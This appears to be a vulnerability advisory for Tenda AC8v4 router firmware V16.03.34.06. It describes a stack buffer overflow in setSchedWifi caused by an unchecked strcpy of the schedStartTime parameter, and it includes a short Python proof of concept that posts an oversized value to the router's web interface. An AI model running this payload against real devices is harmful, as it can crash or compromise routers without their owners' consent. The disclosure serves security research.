# Tenda AC8v4 V16.03.34.06(1)

## Overview

- Firmware download website: https://www.tenda.com.cn/material/show/103518

## Affected version

V16.03.34.06

## Vulnerability details

The Tenda AC8v4 V16.03.34.06 firmware has a stack overflow vulnerability in the `setSchedWifi` function. The `src` variable receives the `schedStartTime` parameter from a POST request and is later assigned to the `ptr+2` variable, which is fixed at 25 bytes. However, since the user can control the input of  `schedStartTime`, the statement `strcpy((char *)ptr + 2, src);` can cause a buffer overflow. The user-provided  `schedStartTime` can exceed the capacity of the `dest` array, triggering this security vulnerability.

![1735650491449](/img/1735650491449.png)

![1735650523496](/img/1735650523496.png)

![1735650546634](/img/1735650546634.png)

## POC

```python
import requests

url = "http://192.168.1.100/goform/openSchedWifi"
data = {
        "schedStartTime":b'A'*1000
}
requests.post(url=url,data=data)
```

![1735650674572](/img/1735650674572.png)

